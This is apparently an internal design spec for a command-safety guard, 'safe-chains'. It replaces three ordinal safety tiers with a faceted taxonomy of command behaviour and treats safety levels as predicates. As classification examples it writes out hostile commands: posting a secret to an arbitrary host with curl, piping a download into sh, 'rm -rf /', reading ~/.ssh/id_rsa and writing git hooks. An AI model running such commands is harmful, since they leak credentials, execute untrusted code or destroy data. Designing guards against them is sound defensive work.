# Behavioral Capability Model — spec v1

Status: draft for review (2026-07-01). Internal design note — not part of the rendered book.

This is the 1.0 specification for re-architecting safe-chains from a single
ordinal safety level (`Inert < SafeRead < SafeWrite`) to a faceted description of
what each command actually does. It defines the model, the taxonomy, how safety
levels are derived, how research is recorded, and a staged plan to get there.

## 1. Why

The three-tier level is a lossy summary. Two problems:

- **Not enough resolution.** `curl https://api.internal/health` (read a fixed
  endpoint), `curl -X POST -d @secret https://any.host` (exfiltrate a secret to
  an arbitrary host), and `curl -o out https://cdn/file` (download a file) all
  collapse to "touches the network." `rm file` and `rm -rf /` collapse to
  "SafeWrite-no." A user who wants "let it read and write my working tree but
  never touch the network or my credentials" cannot express that.
- **Lossy research.** We do careful per-command analysis and then throw most of
  it away, keeping one enum value and a prose blob. The prose isn't queryable,
  isn't per-flag, and can't be recombined into a different policy.

The fix is to record the behavior, not a verdict, and derive verdicts from it.

## 2. Model

### 2.1 Core objects

- **Command-form** — a specific invocation shape: a base command plus a path of
  subcommands, the set of flags present, and the shapes of positional arguments.
  `git push --force`, `git status`, and `git config user.name x` are three
  distinct command-forms of `git`.
- **Capability** — one thing a command-form can do, described as a point in the
  taxonomy (§3): an *operation* plus values on the applicable *facets*. Reading a
  file to stdout is one capability; opening a network connection is another.
- **Behavior profile** — the *set* of capabilities a command-form exhibits. Most
  commands have several. The profile is the unit we store and reason about.
- **Facet** — one orthogonal dimension of the taxonomy (locus, reversibility,
  …). Each facet has a small, fixed, operationally-defined vocabulary of terms.
- **Safety level** — a named **admissibility predicate** over facet-space (§5). A
  profile *passes* a level iff every capability in it lies in the level's
  admissible region. Levels are data, not code; users can define their own.

### 2.2 The central relationship

```
invocation ──parse/resolve──▶ behavior profile (set of capabilities)
                                     │
              safety level L ────────┼──▶ admit?  (every capability ∈ L's region)
              (a predicate)          │
                                     ▼
                          allow · prompt · deny
```

Allowlist-only is preserved: an unknown command has *no* profile, and the empty
profile is treated as "unclassified" → never auto-approved. The taxonomy only
enriches the approved side; it never auto-approves something we haven't
described.

## 3. The taxonomy (facets)

A capability assigns a value to each facet that applies to its operation. Facets
are **orthogonal**; richness comes from combinations and from the *set* of
capabilities, not from a large vocabulary. Every term is **named and defined**,
never a bare number (§6).

Ordinal facets are listed low→high severity. "Applies to" notes which operations
populate the facet.

### F1 · Operation (categorical)

The kind of act. A capability has exactly one operation.

| term | definition |
|---|---|
| `observe` | reads or inspects state and reports it; changes nothing |
| `create` | brings new state into existence (new file, new resource) |
| `mutate` | changes existing state in place |
| `destroy` | removes state (delete, drop, revoke, truncate) |
| `execute` | runs other code/commands (see F6 for whose) |
| `communicate` | performs network I/O (see F5) |
| `configure` | changes settings that alter how *future* commands behave |
| `authorize` | changes credentials, keys, trust, or access grants |
| `control` | starts/stops/signals processes, services, or devices |

`configure` and `authorize` are deliberately split out of `mutate` because their
danger is not the write itself but its downstream effect (see F7).

### F2 · Locus (ordinal) — what the effect touches

| term | definition / discriminator |
|---|---|
| `process` | in-memory or stdout only; gone when the process exits |
| `temp` | explicit throwaway paths: `/tmp`, `/private/tmp`, `/dev/null`, `$TMPDIR` |
| `worktree` | files under the cwd/project that are ordinary data |
| `worktree-trusted` | project files another tool auto-executes/trusts: `.git/`, `.envrc`, hooks, CI configs |
| `user` | the invoking user's account state: home dotfiles, `~/.config`, `~/.ssh`, keychain, shell rc |
| `machine` | system-wide: `/etc`, system services, other users, root-owned paths |
| `remote` | a system other than this host (a specific remote, or an arbitrary one) |

`worktree` vs `worktree-trusted` and `local` vs `remote` are the two boundaries
we have repeatedly hand-patched; here they are first-class.

### F3 · Reversibility (ordinal) — can the effect be undone

| term | definition / discriminator |
|---|---|
| `none` | no persistent effect (pure `observe`) |
| `trivial` | idempotent, or the tool ships a first-class undo |
| `recoverable` | undoable from VCS / recycle / snapshot without special prep |
| `effortful` | recoverable only from out-of-band backups the user must already have |
| `irreversible` | destroys data or history with no recovery path (`--force`, secure-delete, remote destruction) |

### F4 · Disclosure (ordinal) — who can learn data as a result

| term | definition / discriminator |
|---|---|
| `none` | no information leaves its origin |
| `local-process` | data surfaces to the invoking process / stdout → **the agent and model provider see it** |
| `local-persistent` | data written where other local users/processes can read it |
| `trusted-remote` | data sent to a specific endpoint the user configured/authenticated to |
| `shared-remote` | data sent where collaborators / tenant members can read it (shared bucket, internal channel) |
| `public` | data sent somewhere world-readable (public post/repo, paste service) |

This is the "how exposed — to internal users, to the public" axis, made precise.
Note `local-process` is the info-disclosure caveat already in `security.md`.

### F5 · Network reach (facet with defined kinds)

Reach is not purely ordinal; it has kinds. Each kind is defined; a capability may
carry more than one.

| term | definition / discriminator |
|---|---|
| `none` | no socket opened |
| `loopback` | localhost / UNIX socket only |
| `outbound-fixed` | connects out to an endpoint fixed by the tool or given as a literal argument |
| `outbound-arbitrary` | destination is caller/attacker-influenceable (a URL/host argument that could be anything) |
| `inbound-listen` | binds and listens, exposing a port |

`outbound-arbitrary` is the key severity discriminator (exfiltration-to-anywhere,
SSRF-shaped). Whether `outbound-fixed` < `inbound-listen` is left open (§9).

### F6 · Execution provenance (ordinal by trust) — whose code runs

| term | definition / discriminator |
|---|---|
| `none` | runs no external code |
| `self` | runs only the tool's own fixed logic |
| `caller-inline` | runs code supplied inline on the command line (`bash -c`, `ruby -e`) — the human typed it |
| `caller-file` | runs code from a file named on the command line (`ruby script.rb`) |
| `ambient-config` | runs code from config *in scope but not named on the command line*: Makefile targets, git hooks, `.envrc`, plugins → **the self-escalation surface** |
| `network-sourced` | runs code fetched over the network (`curl \| sh`, remote plugin install) |

This axis unifies eval-safety, config-trust, and redirect-to-hooks. The danger is
`ambient-config`/`network-sourced` (code the user did not obviously authorize);
`caller-inline` is visible to the human who typed it.

### F7 · Persistence (ordinal) — does the effect outlive the command

| term | definition / discriminator |
|---|---|
| `transient` | effect ends with the command |
| `data` | leaves durable data-only state (a written file) |
| `reconfiguring` | changes settings that alter future command behavior (`git config core.pager`, PATH, env, `jj config set`) |
| `installing` | adds/removes executables, services, hooks, cron, startup items — future autonomous execution |

F7 is why a *local* write (`git config`, `> .git/hooks/pre-commit`) can be more
dangerous than its locus suggests: it is `reconfiguring`/`installing`, not `data`.

### F8 · Secret exposure (ordinal)

| term | definition / discriminator |
|---|---|
| `none` | no secret material involved |
| `uses-ambient` | relies on already-present credentials (implicitly authenticated) |
| `reads` | reads secret material (private keys, tokens, password stores) |
| `writes` | creates/rotates credentials |
| `transmits` | sends secret material outward |

### F9 · Scale (ordinal) — breadth of one operation

| term | definition / discriminator |
|---|---|
| `single` | one named item |
| `bounded` | a bounded set (a glob, a directory, an explicit list) |
| `unbounded` | unbounded recursion / mass operation (`rm -rf`, `find -exec`, `chmod -R /`) |

### F10 · Cost (ordinal) — optional, lower priority for v1

`none` → `local-resource` → `metered` (provisions billable resources / paid API)
→ `quota` (consumes limited shared rate limits or seats).

### 3.1 A capability record

```
capability {
  operation: mutate
  locus: remote
  reversibility: recoverable        # push is revertable; --force makes it irreversible
  disclosure: shared-remote         # the repo's readers
  network: [outbound-fixed]
  execution: self
  persistence: data
  secret: uses-ambient              # uses configured push credentials
  scale: bounded
  because: "updates refs on the configured remote over HTTPS/SSH"   # discriminator (§6)
  evidence: { source: "git-push(1)", url: "...", researched_version: "git 2.46" }
}
```

Facets not listed default to their zero term (`none`/`transient`/`single`).

## 4. Worked examples

Each command-form → a set of capabilities. (Abbreviated; one line per capability.)

- `echo hi` → `{observe·process·disclosure=local-process}`
- `cat ~/.ssh/id_rsa` → `{observe·locus=user·disclosure=local-process·secret=reads}`
- `echo x > build/out.txt` → `{create·locus=worktree·reversibility=recoverable·persistence=data}`
- `echo x > .git/hooks/pre-commit` → `{create·locus=worktree-trusted·persistence=installing}`
- `rm file.txt` → `{destroy·locus=worktree·reversibility=effortful·scale=single}`
- `rm -rf /` → `{destroy·locus=machine·reversibility=irreversible·scale=unbounded}`
- `git status` → `{observe·locus=worktree·disclosure=local-process}`
- `git push` → `{mutate·locus=remote·network=[outbound-fixed]·disclosure=shared-remote·secret=uses-ambient·reversibility=recoverable}`
- `git push --force` → same, but `reversibility=irreversible`
- `git config core.pager X` → `{configure·locus=user·persistence=reconfiguring}`
- `curl https://api.internal/health` → `{communicate·network=[outbound-fixed]·disclosure=trusted-remote}`
- `curl -X POST -d @secret https://$HOST` → `{communicate·network=[outbound-arbitrary]·disclosure=public?·secret=transmits}`
- `curl https://x | sh` → adds `{execute·execution=network-sourced}`
- `terraform apply` → `{create·locus=remote·cost=metered·persistence=installing·reversibility=effortful}`
- `ssh host cmd` → `{execute·locus=remote·network=[outbound-arbitrary]·execution=self}`
- `mise activate bash` (stdout only) → `{observe·process·disclosure=local-process}` (eval-safe = this profile)

These examples double as the taxonomy's first regression fixtures (§6, §8).

## 5. Safety levels as predicates

A safety level is an **admissible region** in facet-space, written as a predicate.
A profile passes iff **every** capability satisfies the predicate.

The legacy tiers become predicates — and become *precise*, capturing the
carve-outs we kept adding by hand:

```
level "inert":
  operation ∈ {observe}
  ∧ locus ≤ temp
  ∧ disclosure ≤ local-process
  ∧ network = none ∧ secret = none

level "read-local":                         # ≈ old SafeRead
  operation ∈ {observe}
  ∧ locus ≤ machine
  ∧ network ≤ loopback
  ∧ secret ≤ uses-ambient                   # reading id_rsa (secret=reads) is NOT read-local

level "write-local":                        # ≈ old SafeWrite, as we actually want it
  operation ∈ {observe, create, mutate}
  ∧ locus ≤ worktree                        # excludes worktree-trusted, user, machine, remote
  ∧ reversibility ≤ recoverable
  ∧ persistence ≤ data                      # excludes reconfiguring / installing
  ∧ network ≤ loopback
  ∧ disclosure ≤ local-process
  ∧ execution ≤ caller-inline
```

Everything we discovered this cycle falls out of the predicate instead of being a
special case: `> .git/hooks/*` fails on `locus`; `git config` fails on
`persistence`; `rm -rf` fails on `reversibility`/`scale`; reading `~/.ssh/id_rsa`
fails on `secret`.

Additional shipped levels can be defined the same way (e.g. `read-remote-fixed`,
`local-dev` = write-local + `outbound-fixed` fetches). **Users define custom
levels by writing their own predicate** — pick allowed operations and per-facet
thresholds. That is the end-state power feature, and it is just data.

## 6. Non-arbitrariness protocol (the hard requirement)

The rule: *many* levels, but never an arbitrary one. Enforced structurally.

1. **Terms are named and defined, never numbered.** A facet term is admissible
   into the taxonomy only if it ships with: a one-line **definition**, a
   **discriminator** (the operational test that distinguishes it from its
   neighbors), and **≥2 canonical examples** — one positive and one *negative
   near-miss* (an invocation that looks like it but isn't). No `N3`.
2. **Every classification cites its discriminator.** A capability record must
   carry a `because` string that states *why* this facet value applies to *this*
   command-form, in terms of the discriminator: "`--force` sets `+` on the
   refspec, overwriting remote history → `reversibility=irreversible`." A record
   without a `because` is invalid.
3. **Evidence is mandatory.** `source` (man page / source / official docs),
   `url`, and `researched_version`. This replaces the free-text `description`
   with per-capability, queryable justification.
4. **Classification golden-set.** A frozen corpus of invocations with expected
   facet values (the §4 examples, grown). Any taxonomy change must keep the
   golden-set classifiable and re-review the diffs. This keeps the vocabulary
   falsifiable rather than a matter of taste.
5. **Adding a term requires a demonstrated gap.** A new facet term (or facet)
   ships only with a real command-form the existing vocabulary cannot express —
   the same bar we hold for new TOML primitives today.

## 7. Data model, storage, and the separate project

### 7.1 Per-node capabilities

Capabilities attach to nodes of the command grammar: the base command, each
subcommand, each flag, each flag-with-value, and each positional shape. An
invocation activates a path/set of nodes; the profile is assembled from them
(§8). This is the "definitions per flag/subcommand" requirement and drives the
parser refactor.

### 7.2 The capability database

A structured store (richer than today's `SAMPLE.toml`) keyed by
`tool → node-path → capabilities[]`, plus:

- the **taxonomy definition** (facets + terms + definitions/discriminators/
  examples), versioned;
- the **level definitions** (predicates); defaults ship, users add their own;
- the **golden-set** fixtures.

### 7.3 Its own project

Long-term the database + research tooling becomes its own project (working name:
*the capability registry*). It owns: the schema, the research/authoring workflow,
validation (every record has `because` + evidence; golden-set passes), and a
**compiler** that emits, for a chosen level, the decision tables (or a compact
artifact) that safe-chains links. safe-chains becomes a *consumer* of a compiled
artifact rather than the home of the data. Benefits: the taxonomy is reusable
beyond safe-chains, the research is independently versioned and auditable, and
other tools (docs, audits, other guards) can consume it.

Boundary: safe-chains keeps the parser, the profile-resolution engine, the level
predicates evaluator, and the harness integrations. The registry owns the data
and its validation. The compiled artifact is the contract between them.

## 8. Parsing and profile resolution

Today dispatch returns a single `Verdict`. The new engine resolves an invocation
to a **profile**, then evaluates the chosen level.

Node kinds and how they contribute:

- **Additive** — a subcommand/flag *adds* capabilities (`push` adds the remote
  mutate; `-o FILE` adds a write whose locus is classified from `FILE`).
- **Modifier** — a flag *transforms* facets of existing capabilities:
  - `--dry-run`/`-n` → collapse all capabilities to `observe` (nothing happens);
  - `--force` → `reversibility := irreversible`;
  - `-r`/`-R` → `scale := unbounded`;
  - `-o FILE`/redirect → retarget locus by classifying the path argument.
- **Gating** — a capability is present only when a required flag is (unlocks).

Two engine pieces this needs:

- **Argument shape classifiers** — functions that map an argument value to a facet
  value: `classify_locus(path)` (generalizes the `is_safe_write_target` /
  `PositionalShape` work already in the tree), `classify_destination(url/host)`
  (fixed vs arbitrary). These make argument-dependent facets first-class.
- **A profile algebra** — union of additive capabilities, then apply modifiers in
  a defined order. Modifiers must be commutative or explicitly ordered; the
  golden-set pins the results.

The evaluator then checks the profile against the active level's predicate. The
CST parser mostly stands; the registry/dispatch layer is where the work lands.

## 9. Open design questions

1. **Facet finalization.** Is 9–10 the right count? Candidates to merge:
   network-reach vs disclosure (mechanism vs audience — I argue keep both). Is
   `cost` in scope for v1?
2. **Ordinality where it's fuzzy.** Network reach and operation are not cleanly
   ordinal. Model them as sets with per-term severity rather than a scalar?
3. **How many default levels**, and their exact predicates. Start by re-expressing
   the three tiers (bridge/regression), then add.
4. **Argument-dependent facets at static-check time.** `> $VAR` and globbed
   destinations are unresolved statically; the conservative default (treat
   unresolvable as worst-case) mirrors what we just did for redirect targets —
   formalize it as a facet-resolution rule.
5. **Confidence / partial classification.** A command-form we've only partly
   researched: represent as a profile with an explicit `unclassified` capability
   that fails all but the most permissive levels, so partial data is safe.
6. **Compiled-artifact format** and the safe-chains↔registry contract.

## 10. Staged roadmap

- **Stage 0 — this spec.** Agree the model and the facet set.
- **Stage 1 — Taxonomy v1.** Freeze facets + terms with definitions,
  discriminators, and examples. Pure design; no code. Deliverable: the taxonomy
  doc + the initial golden-set.
- **Stage 2 — Pilot & stress-test.** Hand-author capability profiles for ~20
  deliberately diverse command-forms (git, curl, rm, jj, ssh, docker, terraform,
  cat, a compiler, a redirect). Iterate the taxonomy until it expresses them
  without arbitrary judgments. This validates granularity before scaling.
- **Stage 3 — Levels & bridge.** Express `inert`/`read-local`/`write-local` as
  predicates. Prove equivalence: for the pilot corpus, the new engine's verdict
  under `write-local` matches the current engine. This is the regression bridge.
- **Stage 4 — Engine.** Build profile resolution (nodes, modifiers, shape
  classifiers) + predicate evaluation behind a feature flag. Run old and new in
  parallel over the full test corpus and diff every disagreement.
- **Stage 5 — Corpus migration.** Migrate commands incrementally; un-migrated
  commands fall back to the legacy tier (an `unclassified` bridge). Long tail.
- **Stage 6 — Extract the registry project.** Move data + validation + compiler
  out; safe-chains consumes the compiled artifact. Publish the taxonomy.
- **Stage 7 — User-defined levels.** Ship custom-level authoring (predicates as
  user config), reusing the trusted-config model from v0.205.0.

## 11. What does not change

- Allowlist-only: no profile ⇒ never auto-approved.
- The CST parser and shell-safety analysis (segments, substitutions, redirects).
- The harness integrations and the trusted-config boundary.
- The research bar: independent, evidence-backed, latest-upstream — now recorded
  structurally instead of as prose.
